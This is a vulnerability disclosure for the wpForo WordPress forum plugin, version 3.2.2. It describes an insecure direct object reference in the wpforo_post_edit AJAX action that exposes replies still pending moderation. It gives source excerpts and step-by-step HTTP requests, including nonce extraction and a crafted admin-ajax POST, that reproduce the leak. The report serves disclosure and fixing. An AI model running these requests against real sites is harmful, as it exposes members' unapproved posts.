https://wordpress.org/plugins/wpforo/

## Component type
WordPress plugin

## Affected component
wpForo - Forum Plugin

## Component slug
wpforo

## Component link
https://wordpress.org/plugins/wpforo/

## Affected version(s)
3.2.2

## Pre-requisite
Subscriber

## OWASP 2021: Vulnerability class
A01:2021 - Broken Access Control

## OWASP 2021: Vulnerability type
Insecure Direct Object References (IDOR)

## Vulnerability description

The `wpforo_post_edit` AJAX action (`includes/hooks.php`), used to fetch the
pre-filled edit form for a forum post, retrieves the target post via
`Posts::get_post($postid, false)`. The `false` disables both checks that
`Posts::_get_post()` (`classes/Posts.php`) otherwise runs by default: (1)
the caller must have `vf` (view forum) capability in the post's forum, and
(2) if the post is pending/unapproved (`status` non-zero) and the caller
isn't its owner, the caller must have `au` (approve/moderate) capability.
Every other call site in the plugin uses the protected default.

The handler's own replacement check, `forum_can('eor', $forumid) ||
forum_can('eot', $forumid)` ("can edit own reply/topic"), is a forum-wide
usergroup capability, on by default for wpForo's stock "Registered"
usergroup (the group every WordPress Subscriber maps to). It carries no
per-post ownership information and no awareness of approval status.

A code comment at this exact call site documents a prior partial fix: for
guests, an explicit `wpforo_guest_owns_post()` ownership check was added
because "forum_can() ... takes no post id, so for guests it cannot prove
ownership of THIS post." The logged-in-user branch immediately below never
received the equivalent fix.

Because the topic itself (`WPF()->topic->get_topic($post['topicid'])`) is
still fetched through the protected path, this is not exploitable against
whole pending topics/first-posts (correctly hidden). It is exploitable
against a pending **reply** inside a topic that is otherwise already public
and approved, exactly the state wpForo's moderation queue (new members'
first N posts held for approval, or posts flagged back to pending) is
meant to keep confidential until a moderator reviews it. Any authenticated
member can read such a reply's full title and body via this action, before
a moderator ever sees or approves it. Full source excerpts are in the
"Additional information" section.

## How to reproduce

Tested against wpForo 3.2.2 on a local WordPress 6.x instance with two
Subscriber-role forum accounts: `staffuser` (post owner) and `attacker`
(unrelated account, wpForo's default "Registered" usergroup, no special
configuration). A reply from `staffuser` was placed in a public, approved
topic with `status = 1` (pending moderator approval), simulating wpForo's
own moderation-queue state for a new/flagged member post.

1. Confirm the pending reply is not visible through normal browsing as
   `attacker` (topic loads, reply content does not appear):

```
GET /community/main-forum/draft-pricing-proposal-for-review/ HTTP/1.1
Host: <target-site>
Cookie: wordpress_logged_in_...=<attacker session cookie>
```
Response: 200, topic page renders, the pending reply's body text is absent.

2. As `attacker`, load any forum page to obtain a `wpforo_post_edit` nonce
   (this nonce is generic to the action, not scoped to any post or topic,
   and is present on every page where the forum scripts are enqueued):

```
GET /community/ HTTP/1.1
Host: <target-site>
Cookie: wordpress_logged_in_...=<attacker session cookie>
```
Extract the value of `wpforo_ajax_nonces.wpforo_post_edit` from the page's
inline script block (in this test: `027e61eafd`).

3. Call the AJAX action directly with the pending reply's `postid`:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: <target-site>
Cookie: wordpress_logged_in_...=<attacker session cookie>
Content-Type: application/x-www-form-urlencoded
Referer: http://<target-site>/community/

action=wpforo_post_edit&postid=<pending_reply_postid>&_wpfnonce=027e61eafd
```

Response (200, `application/json`):

```json
{
  "success": true,
  "data": {
    "html": "... <textarea ...>Pending reply: internal margin numbers awaiting moderator approval, not yet public.</textarea> ..."
  }
}
```

`success: true` and the full reply body are returned to `attacker`, an
account with no relationship to the post and no moderation privileges,
despite the post never having been approved and being confirmed hidden
from that same account through every normal browsing path.

Any `postid` on the site can be probed this way regardless of ownership;
only whether the id currently maps to a pending reply in a forum the
caller can otherwise browse determines whether content comes back.

## Additional information

**Source excerpts.**

`classes/Posts.php`, the protected default path:

```php
public function _get_post( $postid, $protect = true ) {
    $sql  = "SELECT * FROM `" . WPF()->tables->posts . "` WHERE `postid` = %d";
    $post = (array) WPF()->db->get_row( WPF()->db->prepare( $sql, $postid ), ARRAY_A );

    if( $protect ) {
        if( isset( $post['forumid'] ) && $post['forumid'] && ! WPF()->perm->forum_can( 'vf', $post['forumid'] ) ) {
            return [];
        }
        if( isset( $post['status'] ) && $post['status'] && ! wpforo_is_owner( $post['userid'], $post['email'] ) ) {
            if( isset( $post['forumid'] ) && $post['forumid'] && ! WPF()->perm->forum_can( 'au', $post['forumid'] ) ) {
                return [];
            }
        }
    }
    ...
}
```

`includes/hooks.php`, the vulnerable call site:

```php
function wpforo_post_edit() {
    wpforo_verify_nonce( 'wpforo_post_edit' );
    $r = [ 'html' => '' ];
    if( $postid = wpforo_bigintval( wpfval( $_POST, 'postid' ) ) ) {
        if( $post = WPF()->post->get_post( $postid, false ) ) {
            if( ! is_user_logged_in() && ! wpforo_guest_owns_post( $postid ) ) {
                wp_send_json_error( $r );
            }
            if( WPF()->perm->forum_can( 'eor', $post['forumid'] ) || WPF()->perm->forum_can( 'eot', $post['forumid'] ) ) {
                if( $topic = WPF()->topic->get_topic( $post['topicid'] ) ) {
                    ...
                    $post['body'] = htmlspecialchars( $post['body'], ENT_NOQUOTES );
                    ...
                    wp_send_json_success( $r );
                }
            }
        }
    }
    wp_send_json_error( $r );
}
```

**Impact.** Any authenticated forum member (wpForo's own default
Subscriber-equivalent "Registered" usergroup, the access level applied to
ordinary members by default) can read the full text of any other member's
post while it is still pending moderator approval, by iterating `postid`
values through the `wpforo_post_edit` AJAX action. This defeats the
confidentiality guarantee of wpForo's moderation queue: content a site
relies on being held back for review (new-member first posts, auto-
flagged/anti-spam-held posts, posts a moderator has manually unapproved
for review) is disclosed to arbitrary other members before a moderator
ever sees or approves it. No special forum configuration, elevated role,
or non-default setting is required; the moderation-queue feature only
needs to be enabled, which is wpForo's own out-of-the-box default when
`is_draft_on`/pending-post moderation is configured.

**CVSS 3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (6.5)


## Disclosure
 - 30 Sep 2026 - reported via Patchstack
 - 30 Sep 2026 - out of scope within Patchstack
